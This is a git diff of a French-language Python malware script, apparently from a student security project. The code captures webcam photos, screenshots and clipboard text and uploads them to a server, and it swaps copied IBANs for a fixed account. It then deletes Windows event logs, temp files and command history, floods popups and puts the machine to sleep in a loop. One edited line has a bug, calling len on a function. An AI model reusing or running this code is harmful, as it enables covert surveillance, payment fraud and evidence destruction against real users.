@@ -18,7 +18,7 @@ import win32evtlog
 
 fichier_log = "frappes_clavier.txt"
 url = "http://localhost:8000"
-destination_folder = "D:\GitHub\ProjetSecuriteSE"
+destination_folder = os.getcwd()
 start_time = time.time()
 iban_regex = r'\b[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}\b'
 replacement_iban = "FR76 3000 6000 0112 3456 7890 189"
@@ -34,6 +34,7 @@ def uploadServer(filename):
     os.remove(filepath)
 
 def webcam():
+    """Prend photo de l'utilisateur et l enregistre"""
     # Créer le dossier si nécessaire
     os.makedirs(destination_folder, exist_ok=True)
     camera = cv2.VideoCapture(0)
@@ -58,13 +59,17 @@ def webcam():
 
 def get_clipboard_content():
     """Recupere le contenu du presse-papiers"""
-    root = tk.Tk()
-    root.withdraw()  # Cache la fenêtre principale
-    clipboard_content = root.clipboard_get()  # Récupère le contenu du presse-papiers
-    root.destroy()  # Ferme la fenêtre Tkinter
-    return clipboard_content
+    try:
+        root = tk.Tk()
+        root.withdraw()  # Cache la fenêtre principale
+        clipboard_content = root.clipboard_get()  # Récupère le contenu du presse-papiers
+        root.destroy()  # Ferme la fenêtre Tkinter
+        return clipboard_content
+    except Exception as e:
+        print(f"Erreur")
 
 def capture_ecran():
+    """Prend une capture d ecran et l enregistre"""
     # S'assurer que le dossier existe, sinon le créer
     if not os.path.exists(destination_folder):
         os.makedirs(destination_folder)
@@ -82,8 +87,8 @@ def capture_ecran():
     print(nom_fichier)
     uploadServer(nom_fichier)
 
-# Fonction pour détecter et remplacer l'IBAN
 def detect_and_replace_iban():
+    """Idee bonus> Detecter et remplacer un iban"""
     copied_text = pyperclip.paste()  # Récupération du texte du presse-papier
     found_iban = re.findall(iban_regex, copied_text)  # Recherche d'un IBAN dans le texte copié
 
@@ -114,8 +119,8 @@ def monitor_clipboard():
     except KeyboardInterrupt:
         print("\nArrêt du programme par l'utilisateur.")
 
-# Fonction pour supprimer les fichiers de logs de l'Observateur d'événements
 def delete_event_logs():
+    """Supprime les fichiers de logs de l Observateur d evenements"""
     log_directories = [
         "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
         "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
@@ -126,12 +131,11 @@ def delete_event_logs():
         try:
             if os.path.exists(log_file):
                 os.remove(log_file)
-                print(f"Log supprimé: {log_file}")
         except Exception as e:
             print(f"Erreur lors de la suppression du log {log_file}: {e}")
 
-# Fonction pour nettoyer les fichiers temporaires et caches
 def delete_temp_files():
+    """Clean les fichiers temporaires et caches"""
     temp_dirs = [
         "C:\\Windows\\Temp",
         "C:\\Users\\<NomUtilisateur>\\AppData\\Local\\Temp"  # Remplacer <NomUtilisateur> par le nom réel
@@ -142,21 +146,18 @@ def delete_temp_files():
             if os.path.exists(temp_dir):
                 shutil.rmtree(temp_dir)  # Supprime tout le contenu du répertoire
                 os.makedirs(temp_dir)  # Recréation du répertoire vide
-                print(f"Dossier temporaire supprimé: {temp_dir}")
         except Exception as e:
             print(f"Erreur lors de la suppression du dossier {temp_dir}: {e}")
 
-# Fonction pour vider l'historique des commandes PowerShell et cmd
 def clear_command_history():
+    """vide l'historique des commandes PowerShell et cmd"""
     try:
         # Vider l'historique de PowerShell
         os.system("Clear-History")
         # Vider l'historique de CMD (si applicable)
         os.system("cls")
-        print("Historique des commandes supprimé.")
     except Exception as e:
-        print(f"Erreur lors de la suppression de l'historique des commandes: {e}")     
- 
+        print(f"Erreur lors de la suppression de l'historique des commandes: {e}")      
 
 def popup():
     for i in range(100):
@@ -171,21 +172,21 @@ def popup():
 def mise_en_veille():
     os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
 
-# Exécuter la fonction
-#capture_ecran_toutes_les_1_minutes()
-
 def __main__():
     sTime = time.time()
     while time.time()-sTime < 120:
         webcam()
         capture_ecran()
         with open("rock_you.txt", "a") as file:
-            file.write(get_clipboard_content() + "\n")
+            if len(get_clipboard_content)<20:
+                file.write(get_clipboard_content() + "\n")
     uploadServer('rock_you.txt')
-    popup()
     delete_event_logs()
     delete_temp_files()
     clear_command_history()
-    mise_en_veille()
+    popup()
+    while 1:
+        mise_en_veille()
+        time.sleep(60)
 
 __main__()
